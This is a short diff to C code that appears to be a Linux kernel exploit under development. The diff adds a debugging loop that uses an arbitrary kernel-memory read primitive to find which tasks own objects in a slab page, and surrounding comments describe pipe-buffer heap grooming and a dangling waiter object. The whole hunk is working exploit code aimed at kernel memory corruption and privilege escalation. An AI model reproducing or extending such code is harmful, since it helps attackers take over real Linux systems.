@@ -635,6 +635,21 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
             head, (unsigned long long)wflags, (unsigned long long)wmeta,
             (unsigned)(wmeta & 0xffffu), (unsigned)((wmeta >> 16) & 0x7fffu),
             (int)((wmeta >> 31) & 1u));
+    /* owner forensics: who holds the inuse=34 live objects?  Sample three
+     * slots (0/16/32): mm->owner -> task->comm.  Eleven straight rounds
+     * ended inuse=34 after our SIGKILL batch, so the fillers are NOT our
+     * wave children -- identify them before spending more rounds.
+     * A wrong base alignment just fails the cfgfs read benignly. */
+    for (int si = 0; si < 3; si++) {
+      int slot = si * 16;
+      uintptr_t mm = base + (uintptr_t)slot * MM_STRUCT_SZ;
+      uint64_t owner = kernel_read64(conv_fd, mm + MM_OWNER_OFF);
+      uint64_t cl = kernel_read64(conv_fd, owner + TASK_COMM_OFF);
+      uint64_t ch = kernel_read64(conv_fd, owner + TASK_COMM_OFF + 8);
+      pr_info("pipe stuck slot%d mm=%016zx owner=%016llx comm=%.8s%.8s\n",
+              slot, mm, (unsigned long long)owner, (const char *)&cl,
+              (const char *)&ch);
+    }
     /* Fail fast: with the page still pinned in the slab the drain/reclaim
      * rounds below cannot flip it either (round11: owned=0 then 480+1024
      * pipe allocs all wasted while the dangling waiter stayed exposed).
